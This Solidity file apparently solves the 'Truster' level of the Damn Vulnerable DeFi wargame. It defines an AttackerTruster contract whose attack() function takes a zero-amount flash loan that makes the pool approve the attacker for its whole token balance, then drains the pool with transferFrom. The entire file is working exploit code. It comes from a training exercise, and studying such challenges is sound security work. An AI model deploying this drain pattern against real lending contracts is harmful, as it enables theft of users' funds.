// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface ILender {
    function flashLoan(address receiver,uint256 amount) external;
}


interface ITruster {

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;

}

contract AttackerTruster {

    address public pool;
    constructor(address _pool) {
        pool = _pool;
    }

    function attack(address receiver,address damnValuableToken) external{
        uint amount = IERC20(damnValuableToken).balanceOf(pool);
        bytes memory functioncalldata = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        ITruster(pool).flashLoan(0, address(this), damnValuableToken, functioncalldata);
        IERC20(damnValuableToken).transferFrom(pool,receiver,amount);
    }
}